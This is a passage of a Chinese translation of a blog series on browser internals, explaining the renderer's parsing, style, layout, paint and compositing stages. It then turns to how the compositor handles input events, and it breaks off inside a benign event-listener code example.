title="第三部分"></a>第三部分</h1><p>研究了渲染管道从解析到合成的整个过程，希望现在你能自主地去了解更多关于网站性能优化的信息。<br><a name="8c6116f2"></a></p><h2 id="渲染进程的内部机制"><a href="#渲染进程的内部机制" class="headerlink" title="渲染进程的内部机制"></a>渲染进程的内部机制</h2><p>这是关于浏览器工作原理博客系列四部分中的第三部分。之前，我们介绍了<a href="https://github.com/xitu/gold-miner/blob/master/TODO1/inside-look-at-modern-web-browser-part1.md">多进程架构</a>和<a href="https://github.com/xitu/gold-miner/blob/master/TODO1/inside-browser-part2.md">导航流</a>。在这篇文章中，我们将一探渲染进程的内部机制。</p><p>渲染进程涉及 Web 性能的许多方面。由于渲染进程的流程太复杂，因此本文只进行概述。如果你想深入了解，可以在 <a href="https://developers.google.com/web/fundamentals/performance/why-performance-matters/">the Performance section of Web Fundamentals</a> 找到相关资源。</p><p><a name="18e79a87"></a></p><h2 id="渲染进程处理网站内容"><a href="#渲染进程处理网站内容" class="headerlink" title="渲染进程处理网站内容"></a>渲染进程处理网站内容</h2><p>渲染进程负责标签页内发生的所有事情。在渲染进程中，主线程处理服务器发送到用户的大部分代码。如果你使用 web worker 或 service worker，部分 JavaScript 将由工作线程处理。合成和光栅线程也在渲染进程内运行，以高效，流畅地呈现页面。</p><p>渲染进程的核心工作是将 HTML、CSS 和 JavaScript 转换为用户可以与之交互的网页。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616941594-ca3421d9-31e1-4abd-92fd-779a23dae629.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616941594-ca3421d9-31e1-4abd-92fd-779a23dae629.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 1：渲染进程内部包含主线程、工作线程、合成线程和光栅线程</p><p><a name="a183a12f"></a></p><h2 id="解析（Parsing）"><a href="#解析（Parsing）" class="headerlink" title="解析（Parsing）"></a>解析（Parsing）</h2><p><a name="f9a2b4e6"></a></p><h3 id="DOM-的构建"><a href="#DOM-的构建" class="headerlink" title="DOM 的构建"></a>DOM 的构建</h3><p>当渲染进程收到导航的提交消息并开始接收 HTML 数据时，主线程开始解析文本字符串（HTML）并将其转换为文档对象模型（<strong>DOM</strong>）。</p><p>DOM 是一个页面在浏览器内部表现，也是 Web 开发人员可以通过 JavaScript 与之交互的数据结构和 API。</p><p>将 HTML 到 DOM 的解析由 <a href="https://html.spec.whatwg.org/">HTML Standard</a> 规定。你可能已经注意到，将 HTML 提供给浏览器这一过程从不会引发错误。像 <code>Hi! &lt;b&gt;I&#39;m &lt;i&gt;Chrome&lt;/b&gt;!&lt;/i&gt;</code> 这样的错误标记，会被理解为 <code>Hi! &lt;b&gt;I&#39;m &lt;i&gt;Chrome&lt;/i&gt;&lt;/b&gt;&lt;i&gt;!&lt;/i&gt;</code>，这是因为 HTML 规范会优雅地处理这些错误。如果你好奇这是如何做到的，可以阅读 <a href="https://html.spec.whatwg.org/multipage/parsing.html#an-introduction-to-error-handling-and-strange-cases-in-the-parser">An introduction to error handling and strange cases in the parser</a> 的 HTML 规范部分。</p><p><a name="d50d30c4"></a></p><h3 id="子资源加载"><a href="#子资源加载" class="headerlink" title="子资源加载"></a>子资源加载</h3><p>网站通常使用图像、CSS 和 JavaScript 等外部资源，这些文件需要从网络或缓存加载。在解析构建 DOM 时，主线程<strong>会</strong>按处理顺序逐个请求它们，但为了加快速度，“预加载扫描器（preload scanner）”会同时运行。如果 HTML 文档中有 <code>&lt;img&gt;</code> 或 <code>&lt;link&gt;</code> 之类的内容，则预加载扫描器会查看由 HTML 解析器生成的标记，并在浏览器进程中向网络线程发送请求。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616952605-b7b99bd3-bb18-4210-a9a7-fccc901e9247.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616952605-b7b99bd3-bb18-4210-a9a7-fccc901e9247.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 2：主线程解析 HTML 并构建 DOM 树</p><p><a name="f8b53b9a"></a></p><h3 id="JavaScript-阻塞解析"><a href="#JavaScript-阻塞解析" class="headerlink" title="JavaScript 阻塞解析"></a>JavaScript 阻塞解析</h3><p>当 HTML 解析器遇到 <code>&lt;script&gt;</code> 标记时，会暂停解析 HTML 文档，开始加载、解析并执行 JavaScript 代码。为什么？因为 JavaScript 可以使用诸如 <code>document.write()</code> 的方法来改写文档，这会改变整个 DOM 结构（HTML 规范里的 <a href="https://html.spec.whatwg.org/multipage/parsing.html#overview-of-the-parsing-model">overview of the parsing model</a> 中有一张不错的图片）。这就是 HTML 解析器必须等待 JavaScript 运行后再继续解析 HTML 文档原因。如果你对 JavaScript 执行中发生的事情感到好奇，可以看看 <a href="https://mathiasbynens.be/notes/shapes-ics">V8 团队就此发表的演讲和博客文章</a>。</p><p><a name="c202620e"></a></p><h2 id="提示浏览器如何加载资源"><a href="#提示浏览器如何加载资源" class="headerlink" title="提示浏览器如何加载资源"></a>提示浏览器如何加载资源</h2><p>Web 开发者可以通过多种方式向浏览器发送提示，以便很好地加载资源。如果你的 JavaScript 不使用 <code>document.write()</code>，你可以在 <code>&lt;script&gt;</code> 标签添加 <code>[async](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script#attr-async)</code> 或 <code>[defer](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script#attr-defer)</code> 属性，这样浏览器会异步加载运行 JavaScript 代码，而不阻塞解析。如果合适，你也可以使用 <a href="https://developers.google.com/web/fundamentals/primers/modules">JavaScript 模块</a>。可以使用 <code>&lt;link rel=&quot;preload&quot;&gt;</code> 告知浏览器当前导航肯定需要该资源，并且你希望尽快下载。有关详细信息请参阅 <a href="https://developers.google.com/web/fundamentals/performance/resource-prioritization">Resource Prioritization – Getting the Browser to Help You</a>。</p><p><a name="89480b0f"></a></p><h2 id="样式计算"><a href="#样式计算" class="headerlink" title="样式计算"></a>样式计算</h2><p>只拥有 DOM 不足以确定页面的外观，因为我们会在 CSS 中设置页面元素的样式。主线程解析 CSS 并确定每个 DOM 节点计算后的样式。这是有关基于 CSS 选择器对每个元素应用何种样式的信息，这可以在 DevTools 的 <code>computed</code> 部分中看到。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616966199-811ab322-812e-4302-a1f8-e191bc2e8e42.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616966199-811ab322-812e-4302-a1f8-e191bc2e8e42.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 3：主线程解析 CSS 以添加计算后样式</p><p>即使你不提供任何 CSS，每个 DOM 节点都具有计算样式。像 <code>&lt;h1&gt;</code> 标签看起来比 <code>&lt;h2&gt;</code> 标签大，每个元素都有 margin，这是因为浏览器具有默认样式表。如果你想知道更多 Chrome 的默认 CSS，<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/css/html.css">可以在这里看到源代码</a>。</p><p><a name="5aefca55"></a></p><h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><p>现在，渲染进程知道每个节点的样式和文档的结构，但这不足以渲染页面。想象一下，你正试图通过手机向朋友描述一幅画：“这里有一个大红圈和一个小蓝方块”，这并不能让你的朋友知道这幅画究竟长什么样。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616974801-873a48df-424e-48d5-b663-465acdde0a3b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616974801-873a48df-424e-48d5-b663-465acdde0a3b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 4：一个人站在一幅画前，电话线与另一个人相连</p><p>布局是计算元素几何形状的过程。主线程遍历 DOM，计算样式并创建布局树，其中包含 x y 坐标和边界框大小等信息。布局树可能与 DOM 树结构类似，但它仅包含页面上可见内容相关的信息。如果一个元素应用了 <code>display：none</code>，那么该元素不是布局树的一部分（但 <code>visibility：hidden</code> 的元素在布局树中）。类似地，如果应用了如 <code>p::before&#123;content:&quot;Hi!&quot;&#125;</code> 的伪类，则即使它不在 DOM 中，也包含于布局树中。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616983665-27566c02-307e-47de-af21-e1e2b8bea6f8.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616983665-27566c02-307e-47de-af21-e1e2b8bea6f8.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 5：主线程遍历计算样式后的 DOM 树，以此生成布局树</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/gif/164572/1599617069400-412be90b-f35e-4136-9057-673b42f6b644.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/gif/164572/1599617069400-412be90b-f35e-4136-9057-673b42f6b644.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="3-1.gif"></p><p>图 6：由于换行而移动的盒子布局</p><p>确定页面布局是一项很有挑战性的任务。即使是从上到下的块流这样最简单的页面布局，也必须考虑字体的大小以及换行位置，这些因素会影响段落的大小和形状，进而影响下一个段落的位置。</p><p>CSS 可以使元素浮动到一侧、隐藏溢出的元素、更改书写方向。你可以想象这一阶段的任务之艰巨。Chrome 浏览器有整个工程师团队负责布局。<a href="https://www.youtube.com/watch?v=Y5Xa4H2wtVA">BlinkOn 会议的一些访谈</a>记录了他们工作的细节，有兴趣可以了解一下，挺有趣的。</p><p><a name="b196b7cf"></a></p><h2 id="绘制"><a href="#绘制" class="headerlink" title="绘制"></a>绘制</h2><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617001845-6fe976a9-f8e4-4d52-b9e8-8f0cbf23a41f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617001845-6fe976a9-f8e4-4d52-b9e8-8f0cbf23a41f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 7：一个人拿着笔站在画布前，思考着她应该先画圆形还是先画方形</p><p>拥有 DOM、样式和布局仍然不足以渲染页面。假设你正在尝试重现一幅画。你知道元素的大小、形状和位置，但你仍需要判断绘制它们的顺序。</p><p>例如，可以为某些元素设置 <code>z-index</code>，此时按 HTML 中编写的元素的顺序绘制会导致错误的渲染。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617009442-2a9605de-fe23-4173-9d68-7cd9560d1eec.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617009442-2a9605de-fe23-4173-9d68-7cd9560d1eec.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 8：因为没有考虑 z-index，页面元素按 HTML 标记的顺序出现，导致错误的渲染图像</p><p>在绘制步骤中，主线程遍历布局树创建绘制记录。绘制记录是绘图过程的记录，就像是“背景优先，然后是文本，然后是矩形”。如果你使用过 JavaScript 绘制了 <code>&lt;canvas&gt;</code> 元素，那么这个过程对你来说可能很熟悉。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617017546-6e89e4ed-fde3-42eb-a85f-40dceaab9d6e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617017546-6e89e4ed-fde3-42eb-a85f-40dceaab9d6e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 9：主线程遍历布局树并生成绘制记录</p><p><a name="2778d675"></a></p><h3 id="更新渲染管道的成本很高"><a href="#更新渲染管道的成本很高" class="headerlink" title="更新渲染管道的成本很高"></a>更新渲染管道的成本很高</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617114971-f2dbbb36-7fab-4d96-8ae9-d697b6d07676.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617114971-f2dbbb36-7fab-4d96-8ae9-d697b6d07676.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 10：DOM + Style、布局和绘制树的生成顺序</p><p>渲染管道中最重要的事情是：每个步骤中，前一个操作的结果用于后一个操作创建新数据。例如，如果布局树中的某些内容发生改变，需要为文档的受影响部分重新生成“绘制”指令。</p><p>如果要为元素设置动画，则浏览器必须在每个帧之间运行这些操作。大多数显示器每秒刷新屏幕 60 次（60 fps），当屏幕每帧都在变化，人眼会觉得动画很流畅。但是，如果动画丢失了中间一些帧，页面看起来就会卡顿（janky）。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617121888-038a6c49-8dd3-46a1-925b-39347a5121e7.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617121888-038a6c49-8dd3-46a1-925b-39347a5121e7.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 11：时间轴上的动画帧</p><p>即使渲染操作能跟上屏幕刷新，这些计算也会在主线程上运行，这意味着当你的应用程序运行 JavaScript 时动画可能会被阻塞。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617129751-f70ab9bb-06b1-4dd8-8e3c-39dfe9b26911.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617129751-f70ab9bb-06b1-4dd8-8e3c-39dfe9b26911.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 12：时间轴上的动画帧，但 JavaScript 阻塞了一帧</p><p>你可以将 JavaScript 操作划分为小块，并使用 <code>requestAnimationFrame()</code> 在每个帧上运行。有关此主题的更多信息，请参阅 <a href="https://developers.google.com/web/fundamentals/performance/rendering/optimize-javascript-execution">Optimize JavaScript Execution</a>。你也可以<a href="https://www.youtube.com/watch?v=X57mh8tKkgE">在 Web Worker 中运行 JavaScript</a> 以避免阻塞主线程。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617137709-2c3a4a12-e63b-4872-abb7-5e92e3396b95.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617137709-2c3a4a12-e63b-4872-abb7-5e92e3396b95.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 13：时间轴上较小的 JavaScript 块与动画帧一起运行</p><p><a name="c29e4097"></a></p><h2 id="合成"><a href="#合成" class="headerlink" title="合成"></a>合成</h2><p><a name="f9dca3c4"></a></p><h3 id="如何绘制一个页面？"><a href="#如何绘制一个页面？" class="headerlink" title="如何绘制一个页面？"></a>如何绘制一个页面？</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617165140-bc377abc-2cc4-4c1c-b61f-7f20b57fe9d3.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617165140-bc377abc-2cc4-4c1c-b61f-7f20b57fe9d3.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 14：简单光栅处理示意动画</p><p>现在浏览器知道文档的结构、每个元素的样式、页面的几何形状和绘制顺序，它是如何绘制页面的？把这些信息转换为屏幕上的像素，我们称为光栅化。</p><p>处理这种情况的一种简单的方法是，先在光栅化视窗内的画面，如果用户滚动页面，则移动光栅框，并光栅化填充缺少的部分。这就是 Chrome 首次发布时处理光栅化的方式。但是，现代浏览器会运行一个更复杂的过程，我们称为合成。</p><p><a name="9d33d874"></a></p><h3 id="什么是合成"><a href="#什么是合成" class="headerlink" title="什么是合成"></a>什么是合成</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/gif/164572/1599617193349-1b1eec0e-9282-43d0-a626-d4250586804c.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/gif/164572/1599617193349-1b1eec0e-9282-43d0-a626-d4250586804c.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="3-5.gif"></p><p>图 15：合成处理示意动画</p><p>合成是一种将页面的各个部分分层，分别光栅化，并在称为合成线程的单独线程中合成为页面的技术。如果发生滚动，由于图层已经光栅化，因此它所要做的只是合成一个新帧。动画也可以以相同的方式（移动图层和合成新帧）实现。</p><p>你可以在 DevTools 使用 <a href="https://blog.logrocket.com/eliminate-content-repaints-with-the-new-layers-panel-in-chrome-e2c306d4d752?gi=cd6271834cea">Layers 面板</a> 看看你的网站如何被分层。</p><p><a name="a58f1691"></a></p><h3 id="分层"><a href="#分层" class="headerlink" title="分层"></a>分层</h3><p>为了分清哪些元素位于哪些图层，主线程遍历布局树创建图层树（此部分在 DevTools 性能面板中称为“Update Layer Tree”）。如果页面的某些部分应该是单独图层（如滑入式侧面菜单）但没拆分出来，你可以使用 CSS 中的 <code>will-change</code> 属性来提示浏览器。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617197636-f2905a7f-fe09-4b8d-95f1-d20b42e03a6e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617197636-f2905a7f-fe09-4b8d-95f1-d20b42e03a6e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 16：主线程遍历布局树生成图层树</p><p>你可能想要为每个元素都分层，但是合成大量的图层可能会比每帧都光栅化页面的刷新方式更慢，因此测量应用程序的渲染性能至关重要。有关这个主题的更多信息，请参阅 <a href="https://developers.google.com/web/fundamentals/performance/rendering/stick-to-compositor-only-properties-and-manage-layer-count">Stick to Compositor-Only Properties and Manage Layer Count</a>。</p><p><a name="df1192c3"></a></p><h3 id="主线程的光栅化和合成"><a href="#主线程的光栅化和合成" class="headerlink" title="主线程的光栅化和合成"></a>主线程的光栅化和合成</h3><p>一旦创建了图层树并确定了绘制顺序，主线程就会将该信息提交给合成线程。接着，合成线程会光栅化每个图层。一个图层可能会跟整个页面一样大，因此合成线程将它们分块后发送到光栅线程。光栅线程光栅化每个小块后会将它们存储在显存中。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617205653-985b211a-9023-4b91-8f6e-818351f26d57.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617205653-985b211a-9023-4b91-8f6e-818351f26d57.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 17：光栅线程创建分块的位图并发送到 GPU</p><p>合成线程会给不同的光栅线程设置优先级，以便视窗（或附近）内的画面可以先被光栅化。图层还具有多个不同分辨率的块，可以处理放大操作等动作。</p><p>一旦块被光栅化，合成线程会收集这些块的信息（称为<strong>绘制四边形</strong>）创建<strong>合成帧</strong>。</p><p>绘制四边形</p><p>包含诸如图块在内存中的位置，以及合成时绘制图块在页面中的位置等信息。</p><p>合成帧</p><p>一个绘制四边形的集合，代表一个页面的一帧。</p><p>接着，合成帧通过 IPC（进程间通讯）提交给浏览器进程。此时，可以从 UI 线程或其他插件的渲染进程添加另一个合成帧。这些合成器帧被发送到 GPU 然后在屏幕上显示。如果接收到滚动事件，合成线程会创建另一个合成帧发送到 GPU。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617214337-c98717ad-57a9-457c-a936-0926ab93ce12.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617214337-c98717ad-57a9-457c-a936-0926ab93ce12.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 18：合成线程创建合成帧，将其发送到浏览器进程，再接着发送到 GPU</p><p>合成的好处是它可以在不涉及主线程的情况下完成。合成线程不需要等待样式计算或 JavaScript 执行。这就是为什么<a href="https://www.html5rocks.com/en/tutorials/speed/high-performance-animations/">仅合成动画</a>被认为是流畅性能的最佳选择。如果需要再次计算布局或绘制，则必须涉及主线程。</p><p><a name="eNBNH"></a></p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>在这一部分中，我们研究了渲染管道从解析到合成的整个过程，希望现在你能自主地去了解更多关于网站性能优化的信息。<br />在本系列的下一部分也是最后一部分中，我们将更详细地介绍合成线程，看看当用户移动或点击鼠标时会发生什么。</p><p><a name="Yw4q0"></a></p><h1 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h1><p><a name="5f05a04d"></a></p><h2 id="用户输入行为与合成器"><a href="#用户输入行为与合成器" class="headerlink" title="用户输入行为与合成器"></a>用户输入行为与合成器</h2><p>内部揭秘系列博客对现代浏览器如何处理代码、显示页面展开探讨。该系列博客共四篇，这是最后一篇。在上篇博客里，我们了解了 <a href="https://developers.google.com/web/updates/2018/09/inside-browser-part3">渲染进程与合成器</a>。这里我们将一窥当用户输入行为发生时，合成器如何继续保障交互流畅。</p><p><a name="24e93a7e"></a></p><h2 id="浏览器视角下的输入事件"><a href="#浏览器视角下的输入事件" class="headerlink" title="浏览器视角下的输入事件"></a>浏览器视角下的输入事件</h2><p>听到“输入事件”这个字眼，你脑海里闪现的恐怕只是输入文本或点击鼠标。但在浏览器眼中，输入意味着一切用户行为。不单滚动鼠标滑轮是输入事件，触摸屏幕、滑动鼠标同样也是用户输入事件。</p><p>诸如触摸屏幕之类用户手势产生时，浏览器进程会率先将其捕获。然而浏览器进程所掌握的信息仅限于行为发生的区域，因为标签页里的内容都由渲染进程负责处理，所以浏览器进程会将事件类型（如 <code>touchstart</code>）及其坐标发送给渲染进程。渲染进程会寻至事件目标，运行其事件监听器，妥善地处理事件。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617571139-45d3ac9d-6abe-4772-8e68-c68fec9ef28a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617571139-45d3ac9d-6abe-4772-8e68-c68fec9ef28a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 1：输入事件由浏览器进程发往渲染进程</p><p><a name="50c136ae"></a></p><h2 id="合成器接收输入事件"><a href="#合成器接收输入事件" class="headerlink" title="合成器接收输入事件"></a>合成器接收输入事件</h2><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617588105-c1fafd40-4006-4e45-9ba7-db24977c7317.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617588105-c1fafd40-4006-4e45-9ba7-db24977c7317.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 2：悬于页面图层的视图窗口</p><p>在上篇文章里，我们探讨了合成器如何通过合成栅格化图层，实现流畅的页面滚动。如果页面上没有添加任何事件监听，合成器线程会创建独立于主线程的新合成帧。但要是页面上添加了事件监听呢？合成器线程又是如何得知事件是否需要处理的？</p><p><a name="7d55be63"></a></p><h2 id="理解非立即可滚动区"><a href="#理解非立即可滚动区" class="headerlink" title="理解非立即可滚动区"></a>理解非立即可滚动区</h2><p>因为运行 JavaScript 脚本是主线程的工作，所以页面合成后，合成线程会将页面里添加了事件监听的区域标记为“非立即可滚动区”。有了这个信息，如果输入事件发生在这一区域，合成线程可以确定应将其发往主线程处理。如输入事件发生在这一区域之外，合成线程则确定无需等待主线程，而继续合成新帧。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617639083-b50d9822-736d-4f27-922a-0bccc18f94d3.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599617639083-b50d9822-736d-4f27-922a-0bccc18f94d3.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 3：非立即可滚动区输入描述示意图</p><p><a name="4e7abbc5"></a></p><h3 id="设置事件处理器时须注意"><a href="#设置事件处理器时须注意" class="headerlink" title="设置事件处理器时须注意"></a>设置事件处理器时须注意</h3><p>web 开发中常用的事件处理模式是事件代理。因为事件会冒泡，所以你可以在最顶层的元素中添加一个事件处理器，用来代理事件目标产生的任务。下面这样的代码，你可能见过，或许也写过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">document.body.addEventListener(&#x27;touchstart&#x27;,</span><br><span class="line">event =&gt; &#123;</span><br><span class="line">    if (event.target === area) &#123;</span><br><span class="line">        event.preventDefault();</span><br><span class="line">    &#125;</span><br><span 